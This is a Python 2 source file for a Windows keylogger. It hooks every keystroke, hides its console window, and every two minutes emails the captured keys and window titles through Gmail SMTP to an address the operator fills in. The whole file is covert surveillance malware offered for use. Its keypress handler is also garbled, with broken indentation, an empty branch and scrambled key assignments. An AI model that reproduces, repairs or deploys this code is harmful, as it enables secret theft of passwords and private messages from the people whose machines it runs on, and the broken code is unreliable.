try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
#import sys
import threading
#import urllib.urlencode,urllib2.ur
import smtplib
#import ftplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
x=''
data=''
count=0

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data,windowTitle
            if len(data)>100:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" 
                PORT = 587 
                USER="youremail@gmail.com"#Specify Username Here 
                PASS="your special gmail external app password"#Specify Password Here
                FROM = USER
                TO = ["youremail@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = "Keylogger data: "+str(ts)+windowTitle
                MESSAGE = data
                message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    data=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(120)
			
def main():
	hide()
	email=TimerClass()
	email.start()
	return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global data,windowTitle
    if (event.Ascii==13):
        keys='<ENTER>'
    elif (event.Ascii==8):
        keys='<BACK SPACE>'
    elif (event.Ascii==9):
        keys='<TAB>'
	if (event.KeyID==44):		
		keys='<CAPS>'
		keys='<LSHIFT>'
	elif event.KeyID==160:
	elif event.KeyID==161:
		keys='<RSHIFT>'
    else:
        keys=chr(event.Ascii)
	windowTitle=event.WindowName
    data=data+keys 

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()